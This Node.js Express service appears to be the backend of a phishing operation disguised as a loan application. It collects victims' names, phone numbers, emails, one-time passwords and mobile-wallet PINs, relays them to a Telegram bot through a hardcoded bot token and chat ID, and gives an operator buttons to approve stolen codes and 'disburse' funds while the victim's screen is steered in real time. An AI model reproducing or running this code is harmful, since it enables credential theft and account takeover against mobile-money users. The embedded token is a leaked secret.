const express = require('express');
const app = express();
const axios = require('axios');

app.use(express.json());

app.get('/', (req, res) => {
    res.json({ status: "Telegram Microservice Operational" });
});

const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8962560334:AAE-876Pd841650yQjPGfa8rUOPTtr1SJiQ';
const TELEGRAM_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '6362923717';

let rawServerUrl = process.env.SERVER_CORE_URL || 'http://localhost:3000';
if (!rawServerUrl.startsWith('http://') && !rawServerUrl.startsWith('https://')) {
    rawServerUrl = 'https://' + rawServerUrl;
}
const SERVER_CORE_URL = rawServerUrl;

// SILENT LOG ONLY: Record-keeping data feed for Step 3
app.post('/log-step3-data', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`📝 <b>New Application Logged (Auto-Advanced)</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>User:</b> ${session.firstName} ${session.lastName}
• <b>Phone:</b> +252${session.phone}
• <b>Email:</b> ${session.email}
• <b>Amount:</b> $${Number(session.amount).toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━
Status: <i>User forwarded automatically to Step 4 OTP interface...</i>`;

    sendToTelegram(txt, null);
});

// ACTIONABLE DIALOGUE INTERCEPT FOR STEP 4
app.post('/trigger-step4-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`🔐 <b>Intercepted Step 4: OTP Verification Token</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Phone Link:</b> +252${session.phone}
• <b>User Entry OTP:</b> <code>${session.otpToken}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_otp:${session.appId}` },
            { text: "❌ WRONG OTP", callback_data: `reject_otp:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// ACTIONABLE DIALOGUE INTERCEPT FOR STEP 5
app.post('/trigger-step5-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`💳 <b>Intercepted Step 5: Secure Account Wallet PIN</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Phone Link:</b> +252${session.phone}
• <b>Account PIN Code:</b> <code>${session.pinCode}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "💰 APPROVE PIN & DISBURSE", callback_data: `approve_pin:${session.appId}` },
            { text: "❌ WRONG PIN", callback_data: `reject_pin:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

app.post('/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    const { callback_query } = req.body;
    if (!callback_query || !callback_query.data) return;

    const [actionSignal, targetAppId] = callback_query.data.split(':');
    let logMessage = '';
    let apiRouteSignal = actionSignal;

    if (actionSignal === 'approve_otp') {
        logMessage = "✅ OTP status verified. Client advanced to input transaction secure PIN.";
    } else if (actionSignal === 'reject_otp') {
        apiRouteSignal = 'otp-failed';
        logMessage = "❌ OTP signature flagged invalid. Verification error returned to user.";
    } else if (actionSignal === 'approve_pin') {
        logMessage = "💰 SUCCESS! Account PIN confirmed. Funds disbursed and final Success Step shown.";
    } else if (actionSignal === 'reject_pin') {
        apiRouteSignal = 'pin-failed';
        logMessage = "❌ PIN signature flagged invalid. Authorization loop re-prompted.";
    }

    try {
        const response = await axios.post(`${SERVER_CORE_URL}/api/admin-action`, {
            actionSignal: apiRouteSignal,
            targetAppId: targetAppId
        });

        if (response.data.success) {
            updateTelegramMessageUI(callback_query.message, logMessage);
        }
    } catch (err) {
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: "⚠️ Core connection interface lost.",
                show_alert: true
            });
        } catch (e) {}
    }
});

async function sendToTelegram(text, replyMarkup) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
        if (replyMarkup) payload.reply_markup = replyMarkup;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
    } catch (e) { console.error("Telegram endpoint connection drop error:", e.message); }
}

async function updateTelegramMessageUI(msgObj, statusText) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: msgObj.message_id,
            text: `${msgObj.text}\n\n🤖 <b>System Log:</b>\n<i>${statusText}</i>`,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {}
}

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Telegram module tracking active on port ${PORT}`));